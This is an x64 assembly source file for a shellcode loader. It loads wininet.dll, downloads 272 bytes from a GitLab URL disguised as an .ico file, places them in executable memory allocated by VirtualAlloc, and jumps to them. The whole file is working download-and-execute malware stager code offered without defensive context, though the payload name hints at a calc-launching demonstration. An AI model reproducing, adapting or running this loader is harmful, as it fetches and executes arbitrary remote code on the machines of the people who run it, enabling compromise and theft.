includelib wininet.lib
includelib kernel32.lib

.const 
PAYLOAD_LINK byte  'https://gitlab.com/ORCA000/d.rdynamicshellcode/-/raw/main/calc.ico?inline=false', 0
PAYLOAD_SIZE dword 272
.code

	externdef InternetOpenA:proc
	externdef InternetOpenUrlA:proc
	externdef VirtualAlloc:proc
	externdef InternetReadFile:proc
	externdef InternetCloseHandle:proc
	externdef LoadLibraryA:proc


	public asmMain
asmMain proc
	
	sub		rsp, 38h


	push        	6C6C64h  
	mov	        rax,2E74656E696E6977h		; wininet.dll
	push        	rax  
	mov        	rcx,rsp  
	sub         	rsp,20h 
	call        	LoadLibraryA			; LoadLibraryA
	add         	rsp,30h
	
	push		74657374h
	push		0
	mov		rcx, rsp			; 'TEST'
	xor		edx, edx			; dwAccessType
	xor		r8d, r8d			; lpszProxy
	xor		r9d, r9d	    		; lpszProxyBypass
	mov		qword ptr [rsp+20h], 0		; dwFlags
	call		InternetOpenA			; InternetOpenA 
	mov		qword ptr [rsp+30h], rax	; save hInternetSession to stack 


	mov		qword ptr [rsp+20h], 0		; dwContext
	mov		qword ptr [rsp+28h], 80004400h  ; dwFlags
	xor		r9d, r9d			; dwHeadersLength
	xor		r8d, r8d			; lpszHeaders
	mov		rdx, offset PAYLOAD_LINK	; szUrl													
	mov		rcx, qword ptr [rsp+30h]	; hInternetSession from the stack
	call		InternetOpenUrlA 		; InternetOpenUrlA  
	mov		qword ptr [rsp+28h], rax	; hFile is saved on the stack 


	mov		r9d, 40h			; flProtect
	mov		r8d, 3000h			; flAllocationType
	mov		edx, PAYLOAD_SIZE		; dwSize									
	xor		ecx, ecx			; lpAddress			
	call		VirtualAlloc			; VirtualAlloc 
	mov		qword ptr [rsp+20h], rax	; saving to stack 


	mov		r9, rsp
	mov		r8d, PAYLOAD_SIZE		; dwNumberOfBytesToRead										
	mov		rdx, qword ptr [rsp+20h]    	; lpBuffer , from stack 
	mov		rcx, qword ptr [rsp+28h]	; hFile from the stack
	call		InternetReadFile		; InternetReadFile
	
	mov		rcx, qword ptr [rsp+28h]	; hFile from the stack
	call		InternetCloseHandle		; InternetCloseHandle 

	mov		rcx, qword ptr [rsp+30h]	; hInternetSession from the stack
	call		InternetCloseHandle		; InternetCloseHandle 
	
	
	mov		rax, qword ptr [rsp+20h]	; lpBuffer from stack 
	call		rax				; running 
	
	add		rsp, 38h
	ret

asmMain endp

end

